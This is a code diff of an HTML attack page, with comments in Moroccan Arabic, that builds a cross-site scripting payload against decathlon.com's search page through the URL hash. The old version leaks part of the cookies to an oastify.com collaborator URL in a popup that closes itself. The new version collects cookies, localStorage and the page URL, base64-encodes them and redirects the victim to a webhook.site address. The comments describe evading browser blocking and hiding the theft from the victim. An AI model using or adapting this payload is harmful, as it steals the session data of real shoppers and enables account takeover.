@@ -2,24 +2,32 @@
 <html>
 <body>
     <script>
+        // الكود اللي غيتنفذ وسط Decathlon
         let payload = `
             (function(){
-                // كنهزو غير طرف من الكوكيز (مثلا أول 100 حرف) باش ما يجيش الرابط طويل بزاف ويبلوكيه المتصفح
-                var c = btoa(document.cookie).substring(0, 150);
-                var collab = "http://zgjhen584y4pm43ecuidvw0pug07o2cr.oastify.com//?leak=" + c;
+                // جمع الكوكيز والـ OSID والـ Shopify Data
+                var d = {
+                    c: document.cookie,
+                    ls: JSON.stringify(localStorage),
+                    h: window.location.href
+                };
+                // تشفير الداتا باش السيرفر ما يتبلوكاهاش فـ الطريق
+                var secret = btoa(unescape(encodeURIComponent(JSON.stringify(d))));
                 
-                // فتح نافذة جديدة بالداتا
-                var win = window.open(collab, "_blank", "width=100,height=100");
+                // الرابط ديال Webhook ديالك الجديد
+                var web = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0"; 
                 
-                // سد النافذة مورا 2 ثواني باش ما يعيقش الضحية
-                setTimeout(function(){ win.close(); }, 2000);
+                // الهروب الكبير: تحويل الصفحة بالكامل للـ Webhook مع الداتا
+                document.location = web + "?data=" + secret;
             })();
         `;
 
-        let encodedPayload = encodeURIComponent(payload);
-        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";
+        let encoded = encodeURIComponent(payload);
 
-        window.location.href = finalTarget;
+        // الرابط اللي غيستغل ثغرة الـ Hash
+        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+
+        window.location.href = target;
     </script>
 </body>
 </html>
